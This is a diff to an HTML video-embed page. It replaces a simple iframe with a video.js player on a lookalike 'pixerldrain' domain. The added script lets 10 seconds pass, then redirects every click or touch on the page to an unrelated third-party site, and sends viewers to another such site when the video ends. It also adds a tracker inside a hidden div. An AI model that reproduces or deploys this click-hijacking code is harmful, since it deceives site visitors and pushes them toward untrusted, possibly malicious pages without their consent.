@@ -1,15 +1,81 @@
-<!DOCTYPE html>
-<html lang="id">
+
+
+<!doctype html>
+<html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Video Embed</title>
-  <link rel="stylesheet" href="styles.css">
+
+	<meta charset="UTF-8"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1"/>
+	
+	<meta property="og:url" content="https://pixerldrain.xyz//fLLczf"/>
+	<meta property="og:title" content="https://cdn.videy.co/8dl5E8Bp1.mp4"/>
+	
+	<title>https://cdn.videy.co/8dl5E8Bp1.mp4</title>
+	
+	<link rel="shortcut icon" href="https://pixerldrain.xyz//assets/img/icono.png?v=831751602084"/>
+	<link rel="stylesheet" href="https://pixerldrain.xyz//assets/css/styles.css?v=831751602084">
+	<link rel="stylesheet" href="https://vjs.zencdn.net/8.16.1/video-js.css"/>
+	
 </head>
-<body>
-  <div class="container">
-    <img src="https://pixerldrain.xyz/assets/img/icono.png?v=831751602084" class="logo" alt="logo">
-    <iframe class="video-frame" src="https://cdn.videy.co/UlCm6w7F1.mp4" allowfullscreen></iframe>
-  </div>
+<body id="x3gxm1d6i">
+
+<main class="container">
+	<video class="video-js"></video>
+</main>
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="https://vjs.zencdn.net/8.16.1/video.min.js"></script>
+ 
+<script>
+$(document).ready(function(){
+	
+	let is_click = false;
+	let segundos = 10 * 1000;
+	
+	let link = 'https://availablediningshowcase.com/2049394';
+	let link_mp4 = 'https://cdn.videy.co/8dl5E8Bp1.mp4';
+	let video_js = document.querySelector('.video-js');
+	
+	let on_click = function(){
+		if(is_click === true){
+			window.location.href = link;
+		}
+	};
+	
+	$(document).on('click', on_click);
+	$(document).on('touchstart', on_click);
+
+    let player = videojs(video_js, {
+		controls: true,
+		playsinline: true,
+		autoplay: 'muted',
+		preload: 'auto',
+		controlBar: {
+			fullscreenToggle: false
+		},
+		sources: [{
+			src: link_mp4,
+			type: 'video/mp4'
+		}]
+	});
+
+	player.on('ended', function(){
+		window.location.href = 'https://beestark.com/2048149';
+	});
+	
+	setTimeout(function(){
+		is_click = true;
+	}, segundos);
+	
+});
+</script>
+
+ 
+
+<div style="display:none;">
+<script id="_wau5cl">var _wau = _wau || []; _wau.push(["classic", "angel07", "5cl"]);</script>
+<script async src="//waust.at/c.js"></script>
+</div>
+
 </body>
 </html>
